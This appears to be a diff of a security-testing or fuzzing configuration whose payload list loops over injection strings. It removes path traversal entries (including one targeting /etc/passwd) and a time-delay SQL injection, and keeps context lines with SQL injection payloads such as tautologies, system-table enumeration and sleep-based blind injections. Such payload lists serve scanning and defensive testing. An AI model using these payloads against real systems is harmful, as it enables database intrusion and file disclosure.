@@ -6,9 +6,6 @@ metadata:
 
 run for each:
     payloadSet =
-        ".../..../../../",
-        "../../../../../../../../etc/passwd",
-        "../../.../../../../C:/Windows/",
         "'='",
         "'LIKE'",
         "'=0--+",
@@ -36,10 +33,6 @@ run for each:
         "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
         ",(select * from (select(sleep(10)))a)",
         "%2c(select%20*%20from%20(select(sleep(10)))a)",
-        "';WAITFOR DELAY '0:0:30'--",
-        "#       Hash comment",
-        "/*      C-style comment",
-        "-- -    SQL comment",
         ";%00_Nullbyte",
         "`Backtick",
         "'",
